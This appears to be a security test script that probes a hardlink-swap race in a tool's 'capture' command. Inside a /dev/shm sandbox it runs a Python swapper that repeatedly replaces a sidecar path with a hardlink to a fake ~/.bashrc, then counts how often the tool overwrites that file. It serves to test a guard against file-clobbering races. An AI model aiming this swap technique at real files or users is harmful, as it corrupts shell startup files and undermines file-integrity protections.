#!/usr/bin/env bash
# CR-3 — hardlink-swap race probe (the layer O_NOFOLLOW cannot catch).
# The swapper does NOT use symlinks: it atomically replaces the sidecar path with
# a HARDLINK to the sandbox custody file (~/.bashrc), or removes it. A guard that
# checks the path before open() can be defeated; only a post-open identity check
# (fstat on the fd) survives. Scratch only (/dev/shm).
# usage: hardlink-race.sh <tool.py> <iterations> <label>
set -u
export PYTHONDONTWRITEBYTECODE=1
TOOL="$(readlink -f "$1")"; N="${2:-600}"; LABEL="${3:-unlabeled}"
TOOL_SHA=$(sha256sum "$TOOL" | cut -d' ' -f1)
SB=$(mktemp -d /dev/shm/cr3-hlrace-XXXXXX) || exit 1
export TMPDIR="$SB"
H="$SB/home"
mkdir -p "$H/.config/devin" "$H/.omp/agent" "$H/.kimi-code"
printf 'sandbox bashrc\n' > "$H/.bashrc"
printf 'sandbox profile\n' > "$H/.profile"
printf '{}\n' > "$H/.config/devin/mcp_config.json"
printf '{}\n' > "$H/.omp/agent/mcp.json"
printf '# kimi\n' > "$H/.kimi-code/config.toml"
D="$SB/d"; mkdir -p "$D"
V="$SB/victim.conf"; printf 'victim\n' > "$V"

echo "== CR-3 hardlink-swap race probe =="
echo "variant: $LABEL"
echo "tool: $TOOL  sha256=$TOOL_SHA"
echo "iterations: $N   sandbox: $SB"

cat > "$SB/swapper.py" <<'PY'
import itertools, os, sys, time
d, h = sys.argv[1], sys.argv[2]
sidecar = os.path.join(d, "o.txt.sha256")
bashrc = os.path.join(h, ".bashrc")
for mode in itertools.cycle(("hardlink", "remove")):
    tmp = os.path.join(d, "o.tmp")
    try:
        if mode == "hardlink":
            os.link(bashrc, tmp)          # tmp and ~/.bashrc are the same inode
        else:
            open(tmp, "w").close()        # a plain fresh file
        os.rename(tmp, sidecar)           # atomic replace of the sidecar path
    except OSError:
        try: os.remove(tmp)
        except OSError: pass
PY

python3 "$SB/swapper.py" "$D" "$H" &
SW=$!
sleep 0.2
refused=0; allowed=0; hits=0; other=0
for i in $(seq 1 "$N"); do
  printf 'sandbox bashrc\n' > "$H/.bashrc"
  HOME="$H" python3 "$TOOL" capture --out "$D/o.txt" --paths "$V" --label hl-$i \
      >/dev/null 2>"$SB/last.err"; rc=$?
  if head -c 200 "$H/.bashrc" 2>/dev/null | grep -qE '^[0-9a-f]{64}  o\.txt'; then
    hits=$((hits+1)); cp "$H/.bashrc" "$SB/hit-$i.bashrc" 2>/dev/null
    printf 'HIT at iteration %d (exit=%d)\n' "$i" "$rc"
  fi
  case $rc in
    2) refused=$((refused+1));;
    0) allowed=$((allowed+1));;
    *) other=$((other+1));;
  esac
done
kill "$SW" 2>/dev/null; wait "$SW" 2>/dev/null
echo "refusals(exit2)=$refused  allowed(exit0)=$allowed  other=$other"
echo "custody file clobbered via the hardlink swap: $hits / $N"
[ "$hits" -gt 0 ] && echo "verdict: RACY — hardlink swap defeated the guard" \
                  || echo "verdict: no hit in $N tries (window not observed)"
echo "sandbox kept: $SB"
